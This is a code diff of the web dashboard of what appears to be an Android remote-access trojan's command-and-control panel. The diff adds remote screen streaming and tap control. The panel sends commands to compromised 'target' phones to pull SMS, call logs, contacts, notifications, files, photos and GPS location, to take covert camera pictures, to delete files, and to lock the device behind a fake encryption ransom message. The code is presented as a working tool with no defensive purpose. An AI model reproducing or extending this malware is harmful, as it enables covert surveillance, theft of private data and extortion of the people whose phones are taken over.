@@ -32,6 +32,7 @@
         .gal-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(120px, 1fr)); gap:10px; }
         .gal-item img { width:100%; height:100px; object-fit:cover; border-radius:10px; border:1px solid var(--primary); }
         @media (max-width:700px) { .app-container { grid-template-columns:1fr; } }
+        #screen-view { width:100%; max-width:320px; aspect-ratio:9/16; background:#000; margin:0 auto; display:block; border:5px solid #333; border-radius:20px; cursor:crosshair; }
     </style>
 </head>
 <body>
@@ -80,13 +81,12 @@
             document.getElementById('modal-title').innerText = t.toUpperCase();
             
             if(t === 'open_url') {
-                document.getElementById('modal-body').innerHTML = `<p style="margin-bottom:10px; color:var(--dim)">Target Link (Website/DeepLink):</p>
-                               <input id="ourl" placeholder="https://example.com" value="https://google.com" style="padding:15px; font-size:1.1rem; border-color:var(--primary)">`;
-                document.getElementById('modal-footer').innerHTML = `<button style="width:100%; padding:15px;" onclick="cmd('openurl '+document.getElementById('ourl').value)">🚀 OPEN ON TARGET</button>`;
+                document.getElementById('modal-body').innerHTML = `<p style="margin-bottom:10px; color:var(--dim)">Target Link:</p><input id="ourl" value="https://google.com">`;
+                document.getElementById('modal-footer').innerHTML = `<button onclick="cmd('openurl '+document.getElementById('ourl').value)">OPEN</button>`;
                 return;
             }
 
-            const map = { sms:'getsms', calls:'getcalllogs', filemanager:'filemanager', gallery:'gallery', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic', contacts:'getcontacts', info:'deviceinfo' };
+            const map = { sms:'getsms', calls:'getcalllogs', filemanager:'filemanager', gallery:'gallery', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic', contacts:'getcontacts', info:'deviceinfo', control:'screenstream on' };
             if(map[t]) cmd(map[t]);
             render();
         }
@@ -94,140 +94,85 @@
         function closeModal() {
             if(curMod === 'gallery') cmd('exit_gallery');
             if(curMod === 'filemanager') cmd('exit_shell');
+            if(curMod === 'control') cmd('screenstream off');
             document.getElementById('modal').style.display = 'none'; curMod = null;
+        }
+
+        function handleTap(e) {
+            if(curMod !== 'control') return;
+            const rect = e.target.getBoundingClientRect();
+            const x = Math.round(((e.clientX - rect.left) / rect.width) * 480);
+            const y = Math.round(((e.clientY - rect.top) / rect.height) * 854);
+            cmd(`tap ${x} ${y}`);
         }
 
         function render() {
             if(!curMod || !selId || !cache[selId]) return;
             const d = cache[selId], b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
-            const curHash = JSON.stringify(d[curMod] || d.media || d.location || d.info || "");
+            const curHash = JSON.stringify(d[curMod] || d.media || d.location || d.info || d.screen || "");
             
-            if(curMod !== 'contacts' && hash === curHash) return; 
+            if(curMod !== 'contacts' && curMod !== 'control' && hash === curHash) return; 
             hash = curHash;
             b.innerHTML = ""; f.innerHTML = "";
 
-            if(curMod === 'info') {
+            if(curMod === 'control') {
+                b.innerHTML = `<img id="screen-view" onclick="handleTap(event)" src="${d.screen ? 'data:image/jpeg;base64,'+d.screen : ''}" />
+                               <p style="text-align:center; color:var(--primary); font-size:0.7rem; margin-top:10px;">Accessibility: ON | Click screen to Tap</p>`;
+                f.innerHTML = `<button onclick="cmd('screenstream on')">REFRESH STREAM</button>`;
+            } else if(curMod === 'info') {
                 const i = d.info;
                 b.innerHTML = `<div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
-                    <div class="panel" style="background:#0a1212; border-color:#222">
-                        <small style="color:var(--primary)">DEVICE MODEL</small><h2>${i.Model || '?'}</h2>
-                        <small style="color:var(--dim)">${i.Manufacturer || ''}</small>
+                    <div class="panel" style="background:#0a1212;">
+                        <small style="color:var(--primary)">MODEL</small><h2>${i.Model || '?'}</h2>
                     </div>
-                    <div class="panel" style="background:#0a1212; border-color:#222">
-                        <small style="color:var(--secondary)">BATTERY LEVEL</small><h2 style="color:${parseInt(i.Battery)<20?'red':'var(--primary)'}">${i.Battery || '?'}</h2>
-                        <small style="color:var(--dim)">Real-time Status</small>
+                    <div class="panel" style="background:#0a1212;">
+                        <small style="color:var(--secondary)">BATTERY</small><h2>${i.Battery || '?'}</h2>
                     </div>
-                    <div class="panel" style="background:#0a1212; border-color:#222; grid-column:1/-1;">
+                    <div class="panel" style="background:#0a1212; grid-column:1/-1;">
                         <table style="font-size:0.8rem">
                             <tr><td>SIM 1</td><td style="color:var(--primary)">${i['SIM 1'] || 'N/A'}</td></tr>
                             <tr><td>SIM 2</td><td style="color:var(--primary)">${i['SIM 2'] || 'N/A'}</td></tr>
                             <tr><td>WiFi</td><td style="color:var(--secondary)">${i.WiFi || 'N/A'}</td></tr>
                             <tr><td>Number</td><td>${i.PhoneNumber || 'Unknown'}</td></tr>
-                            <tr><td>Android</td><td>Version ${i.AndroidVersion} (SDK ${i.SDKVersion})</td></tr>
                         </table>
                     </div>
                 </div>`;
-                f.innerHTML = `<button onclick="cmd('deviceinfo')">REFRESH INFO</button>`;
             } else if(curMod === 'contacts') {
                 const contacts = d.contacts || [];
-                b.innerHTML = `<input placeholder="Search ${contacts.length} contacts..." onkeyup="filterT(this)" style="margin-bottom:10px;">
-                               <table><tr><th>Name</th><th>Number</th></tr>${contacts.map(c=>`<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')}</table>`;
-                if(contacts.length === 0) b.innerHTML += `<p style="text-align:center; padding:20px; color:var(--dim)">No contacts received yet.</p>`;
-                f.innerHTML = `<button onclick="cmd('getcontacts')">RELOAD CONTACTS</button>`;
-            } else if(curMod === 'sms') {
-                b.innerHTML = `<table><tr><th>Sender</th><th>Text</th></tr>${d.sms.map(l=>`<tr><td>${l.userSender}</td><td>${l.content}</td></tr>`).join('')}</table>`;
-            } else if(curMod === 'calls') {
-                b.innerHTML = `<table><tr><th>Number</th><th>Dur</th></tr>${d.calls.map(l=>`<tr><td>${l.number}</td><td>${l.duration_seconds}s</td></tr>`).join('')}</table>`;
-            } else if(curMod === 'apps') {
-                b.innerHTML = `<table><tr><th>App</th><th>PKG</th></tr>${d.apps.map(a=>`<tr><td>${a.appName}</td><td><button onclick="cmd('run ${a.packageName}')">Run</button> <button class="red-btn" onclick="cmd('uninstall ${a.packageName}')">X</button></td></tr>`).join('')}</table>`;
+                b.innerHTML = `<table><tr><th>Name</th><th>Number</th></tr>${contacts.map(c=>`<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')}</table>`;
             } else if(curMod === 'filemanager') {
                 const fm = d.fm;
-                b.innerHTML = `<div style="display:flex; gap:10px; margin-bottom:10px;"><input id="fmin" placeholder="Search / Execute..."><button onclick="cmd(document.getElementById('fmin').value); document.getElementById('fmin').value=''">EXE</button></div>
-                               <div style="background:#0a1212; padding:8px; border-radius:10px; font-family:monospace; font-size:0.75rem; color:var(--primary); margin-bottom:10px; border:1px dashed #2f4040;">📂 ${fm.path}</div>
-                               <table style="font-size:0.85rem;">
-                                 <tr style="background:#1a2525;"><th style="width:40px"></th><th>Name</th><th style="text-align:right">Action</th></tr>
-                                 ${fm.path !== '/' ? `<tr><td>🔙</td><td onclick="cmd('cd ..'); cmd('ls');" style="cursor:pointer; color:var(--dim)">Parent Directory</td><td></td></tr>` : ''}
-                                 ${fm.files.map(x=>`<tr>
-                                   <td style="font-size:1.2rem">${x.isDirectory?'📁':'📄'}</td>
-                                   <td onclick="cmd('${x.isDirectory?'cd':'get'} ${x.name}'); if('${x.isDirectory}'=='true') cmd('ls');" style="cursor:pointer; ${x.isDirectory?'font-weight:bold; color:var(--primary)':''}">${x.name}</td>
-                                   <td style="text-align:right">
-                                     <button style="padding:4px 8px; font-size:0.7rem;" onclick="if(confirm('Delete ${x.name}?')){ cmd('del ${x.name}'); cmd('ls'); }">DEL</button>
-                                   </td></tr>`).join('')}
-                               </table>`;
-                f.innerHTML = `<button onclick="cmd('cd /storage/emulated/0'); cmd('ls')">SDCARD</button><button onclick="cmd('cd /'); cmd('ls')">ROOT</button>`;
+                b.innerHTML = `<div style="background:#0a1212; padding:8px; border-radius:10px; font-family:monospace; font-size:0.75rem; color:var(--primary); margin-bottom:10px;">📂 ${fm.path}</div>
+                               <table>${fm.files.map(x=>`<tr><td>${x.isDirectory?'📁':'📄'}</td><td onclick="cmd('${x.isDirectory?'cd':'get'} ${x.name}'); if('${x.isDirectory}'=='true') cmd('ls');" style="cursor:pointer;">${x.name}</td><td style="text-align:right"><button onclick="cmd('del ${x.name}'); cmd('ls');">DEL</button></td></tr>`).join('')}</table>`;
             } else if(curMod === 'gallery') {
                 const g = d.gallery;
-                b.innerHTML = `<div class="gal-grid">${g.files.map(x=>`<div class="gal-item"><img src="data:image/jpeg;base64,${x.thumbnail}"/><p style="font-size:0.5rem; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${x.name}</p></div>`).join('')}</div>`;
-                f.innerHTML = `<button onclick="cmd('gallery back')">PREV</button><span style="color:var(--primary)">PAGE ${g.page}</span><button onclick="cmd('gallery next')">NEXT</button>`;
-            } else if(curMod === 'takebackpic' || curMod === 'takefrontpic' || curMod === 'record_back' || curMod === 'record_front') {
+                b.innerHTML = `<div class="gal-grid">${g.files.map(x=>`<div class="gal-item"><img src="data:image/jpeg;base64,${x.thumbnail}"/><p style="font-size:0.5rem">${x.name}</p></div>`).join('')}</div>`;
+                f.innerHTML = `<button onclick="cmd('gallery back')">PREV</button><span>PAGE ${g.page}</span><button onclick="cmd('gallery next')">NEXT</button>`;
+            } else if(curMod === 'takebackpic' || curMod === 'takefrontpic') {
                 const m = d.media;
-                if(m.last_img || m.last_vid) {
-                    const isVid = m.last_vid && curMod.includes('record');
-                    const src = isVid ? m.last_vid : m.last_img;
-                    const isDirect = m.is_direct && !isVid;
-                    b.innerHTML = `<div style="text-align:center;">
-                        ${isVid ? `<video src="/captured_images/${src}" controls style="width:100%"></video>` : 
-                        `<img src="${isDirect ? 'data:image/jpeg;base64,'+src : '/captured_images/'+src}" style="width:100%; border-radius:15px; border:1px solid var(--primary); box-shadow:0 0 20px rgba(0,255,195,0.2);">`}
-                        <br><button class="red-btn" style="margin-top:15px; width:100%; padding:12px;" onclick="closeModal()">OK, UNDERSTOOD (DISMISS)</button>
-                    </div>`;
-                } else b.innerHTML = `<div style="text-align:center; padding:30px;"><i class="fas fa-spinner fa-spin" style="font-size:2rem; color:var(--primary); margin-bottom:15px;"></i><p>${m.status || 'Initiating camera capture...'}</p></div>`;
-            } else if(curMod === 'get_location') {
-                const loc = d.location;
-                if(loc.url) {
-                    b.innerHTML = `<div style="text-align:center;">${loc.img?`<img src="${loc.img}" style="width:100%; border-radius:15px; margin-bottom:10px;">`:''}<p style="font-size:0.8rem">${loc.url}</p><br><a href="${loc.url}" target="_blank"><button>Google Maps</button></a></div>`;
-                } else b.innerHTML = `<p style="text-align:center">Waiting GPS Koordinat...</p>`;
-                f.innerHTML = `<button onclick="cmd('get_location')">REFRESH</button><button class="red-btn" onclick="cmd('stop_location')">STOP</button>`;
+                if(m.last_img) {
+                    b.innerHTML = `<div style="text-align:center;"><img src="${m.is_direct?'data:image/jpeg;base64,'+m.last_img:'/captured_images/'+m.last_img}" style="width:100%; border-radius:15px; border:1px solid var(--primary);"></div>`;
+                } else b.innerHTML = `<p style="text-align:center">${m.status || 'Capturing...'}</p>`;
             } else if(curMod === 'toast') {
-                b.innerHTML = `<p style="margin-bottom:5px; color:var(--dim)">System Message:</p>
-                               <textarea id="lmsg" style="background:#1a2525; border:1px solid #3b5e5e; padding:10px; border-radius:15px; color:#fff; width:100%; height:120px; resize:none;">SYSTEM CRITICAL ERROR\nYour data is being encrypted.\nPlease enter the recovery key.</textarea>
-                               <p style="margin-top:15px; margin-bottom:5px; color:var(--dim)">Unlock PIN:</p>
-                               <input id="lpin" value="1337" style="text-align:center; font-size:1.2rem; font-family:monospace;">`;
-                f.innerHTML = `<button class="red-btn" style="width:100%" onclick="cmd('lock '+document.getElementById('lmsg').value.replace(/\\n/g, '<br>')+'|'+document.getElementById('lpin').value)">LOCK DEVICE</button><button onclick="cmd('unlock')">UNLOCK</button>`;
-            } else if(curMod === 'setwallpaper') {
-                b.innerHTML = `<p style="margin-bottom:10px; color:var(--dim)">Upload Wallpaper:</p>
-                               <div style="background:#1a2525; padding:20px; border-radius:15px; border:2px dashed #3b5e5e; text-align:center; margin-bottom:15px;">
-                                 <input type="file" id="wfile" style="display:none" onchange="uploadWall(this)">
-                                 <button onclick="document.getElementById('wfile').click()"><i class="fas fa-upload"></i> SELECT IMAGE</button>
-                                 <p id="up-stat" style="font-size:0.7rem; margin-top:10px; color:var(--primary)"></p>
-                               </div>
-                               <p style="margin-bottom:5px; color:var(--dim)">Or URL:</p><input id="wurl" placeholder="https://domain.com/hack.jpg">`;
-                f.innerHTML = `<button onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY URL</button>`;
+                b.innerHTML = `<p>Message:</p><textarea id="lmsg" style="width:100%; height:100px; background:#1a2525; color:#fff; border-radius:10px; padding:10px;">SYSTEM LOCKED</textarea><p style="margin-top:10px;">PIN:</p><input id="lpin" value="1337">`;
+                f.innerHTML = `<button class="red-btn" onclick="cmd('lock '+document.getElementById('lmsg').value.replace(/\\n/g, '<br>')+'|'+document.getElementById('lpin').value)">LOCK</button><button onclick="cmd('unlock')">UNLOCK</button>`;
             } else if(curMod === 'notifications') {
                 b.innerHTML = `<table><tr><th>App</th><th>Message</th></tr>${d.notifications.map(n=>`<tr><td>${n.packageName}</td><td>${n.title}: ${n.text}</td></tr>`).join('')}</table>`;
             }
         }
 
-        async function uploadWall(input) {
-            if(!input.files[0]) return;
-            const status = document.getElementById('up-stat');
-            status.innerText = "Uploading to C2...";
-            const formData = new FormData();
-            formData.append('file', input.files[0]);
-            try {
-                const res = await fetch('/api/upload_wallpaper', {method:'POST', body:formData});
-                const data = await res.json();
-                if(data.status === 'ok') {
-                    status.innerText = "Upload Success! Applying...";
-                    const wallUrl = window.location.origin + '/captured_images/' + data.filename;
-                    cmd('set_wallpaper ' + wallUrl);
-                } else status.innerText = "Upload Failed.";
-            } catch(e) { status.innerText = "Error: " + e; }
-        }
-
-        async function delFile(f) { if(!confirm('Erase evidence?')) return; await fetch('/api/delete', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({filename:f})}); hash=""; render(); }
-
         async function poll() {
             try {
                 const res = await fetch('/api/status');
                 state = await res.json();
-                document.getElementById('device-list').innerHTML = state.devices.map(d=>`<div class="device-item ${selId===d.id?'active':''}" onclick="selId='${d.id}'; updateMain();">${d.model}<br><small>${d.id} · ${d.bat}</small></div>`).join('') || "No target online.";
+                document.getElementById('device-list').innerHTML = state.devices.map(d=>`<div class="device-item ${selId===d.id?'active':''}" onclick="selId='${d.id}'; updateMain();">${d.model}<br><small>${d.id}</small></div>`).join('') || "Scanning...";
                 if(selId) {
                     const dres = await fetch(`/api/data/${selId}`);
                     cache[selId] = await dres.json();
                     if(curMod) render();
                 }
             } catch(e){}
-            setTimeout(poll, 3000);
+            setTimeout(poll, curMod === 'control' ? 500 : 3000);
         }
 
         function updateMain() {
@@ -237,20 +182,16 @@
             document.getElementById('conn-stat').style.color = e ? "#00ffc3":"#ff3b9e";
             
             const btns = [
-                {id:'info', i:'fa-circle-info', l:'DEVICE INFO'}, {id:'contacts', i:'fa-address-book', l:'CONTACTS'},
-                {id:'sms', i:'fa-sms', l:'SMS'}, {id:'calls', i:'fa-phone', l:'CALLS'}, {id:'filemanager', i:'fa-folder', l:'FILES'},
-                {id:'gallery', i:'fa-images', l:'GALLERY'}, {id:'notifications', i:'fa-bell', l:'NOTIFS'}, {id:'apps', i:'fa-th', l:'APPS'},
-                {id:'get_location', i:'fa-map-marker-alt', l:'GPS'}, {id:'flash', i:'fa-bolt', l:'FLASH'},
-                {id:'takebackpic', i:'fa-camera', l:'CAM BACK'}, {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'},
-                {id:'record_back', i:'fa-circle-dot', l:'REC BACK'}, {id:'record_front', i:'fa-record-vinyl', l:'REC FRONT'},
-                {id:'setwallpaper', i:'fa-image', l:'WALLPAPER'}, {id:'toast', i:'fa-lock', l:'LOCK/MSG'},
-                {id:'open_url', i:'fa-globe', l:'OPEN URL'}
+                {id:'control', i:'fa-display', l:'SCREEN CONTROL'}, {id:'info', i:'fa-circle-info', l:'INFO'},
+                {id:'contacts', i:'fa-address-book', l:'CONTACTS'}, {id:'sms', i:'fa-sms', l:'SMS'},
+                {id:'calls', i:'fa-phone', l:'CALLS'}, {id:'filemanager', i:'fa-folder', l:'FILES'},
+                {id:'gallery', i:'fa-images', l:'GALLERY'}, {id:'notifications', i:'fa-bell', l:'NOTIFS'},
+                {id:'apps', i:'fa-th', l:'APPS'}, {id:'get_location', i:'fa-map-marker-alt', l:'GPS'},
+                {id:'flash', i:'fa-bolt', l:'FLASH'}, {id:'takebackpic', i:'fa-camera', l:'CAM BACK'},
+                {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'}, {id:'setwallpaper', i:'fa-image', l:'WALLPAPER'},
+                {id:'toast', i:'fa-lock', l:'LOCK/MSG'}, {id:'open_url', i:'fa-globe', l:'OPEN URL'}
             ];
             document.getElementById('main-grid').innerHTML = btns.map(b=>`<div class="btn" onclick="${b.id==='flash'?'flash=!flash; cmd(flash?\'flashon\':\'flashoff\')':'openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`).join('');
-        }
-        function filterT(e) {
-            let v = e.value.toLowerCase(), rows = e.nextElementSibling.rows;
-            for(let i=1; i<rows.length; i++) rows[i].style.display = rows[i].innerText.toLowerCase().includes(v) ? '' : 'none';
         }
         poll();
     </script>
